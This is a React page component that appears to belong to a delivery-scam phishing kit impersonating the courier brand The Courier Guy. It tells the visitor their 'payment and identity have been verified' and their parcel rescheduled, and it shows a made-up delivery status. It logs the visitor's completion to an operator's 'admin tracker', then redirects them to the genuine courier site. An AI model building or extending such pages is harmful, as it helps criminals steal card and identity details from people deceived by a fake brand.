import { Navbar } from "@/components/Navbar";
import { Footer } from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { motion } from "framer-motion";
import { CheckCircle2, Truck } from "lucide-react";
import { useEffect } from "react";
import { useVisitId } from "@/hooks/use-visit-id";
import { fetchWithVisitId } from "@/lib/fetch-with-visit-id";

export default function Success() {
  useVisitId(); // Initialiser le visitId

  useEffect(() => {
    // mark flow as completed in the admin tracker
    void fetchWithVisitId("/api/flows/event", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        step: "success",
        notes: "User reached success page",
      }),
    });
  }, []);

  return (
    <div className="min-h-screen flex flex-col w-full bg-slate-50 font-sans">
      <Navbar />

      <main className="flex-grow py-12 px-4 md:px-8 flex flex-col items-center justify-center">
        <motion.div 
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.5 }}
          className="w-full max-w-md"
        >
          <Card className="border-t-4 border-t-green-500 shadow-lg bg-white overflow-hidden">
            <CardContent className="p-8 text-center space-y-6">
              <div className="flex justify-center mb-2">
                <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center">
                  <CheckCircle2 className="h-10 w-10 text-green-600" />
                </div>
              </div>

              <h2 className="text-2xl font-bold text-brand-blue">
                Verification Successful
              </h2>

              <p className="text-gray-600">
                Thank you. Your payment and identity have been verified. Your delivery has been rescheduled and will arrive within 24-48 hours.
              </p>

              <div className="bg-slate-50 p-4 rounded-lg border border-slate-100 text-left">
                <div className="flex items-center gap-3 mb-2">
                  <Truck className="h-5 w-5 text-brand-orange" />
                  <span className="font-bold text-gray-800">New Delivery Status</span>
                </div>
                <div className="pl-8 space-y-1 text-sm text-gray-500">
                  <p>Status: <span className="text-green-600 font-medium">Out for Delivery</span></p>
                  <p>Est. Date: <span className="text-gray-800 font-medium">{new Date(Date.now() + 86400000).toLocaleDateString()}</span></p>
                </div>
              </div>

              <Button 
                onClick={() => window.location.href = "https://www.thecourierguy.co.za"}
                className="w-full bg-brand-blue hover:bg-slate-800 text-white font-bold py-6"
              >
                Return to Home
              </Button>
            </CardContent>
          </Card>
        </motion.div>
      </main>

      <Footer />
    </div>
  );
}
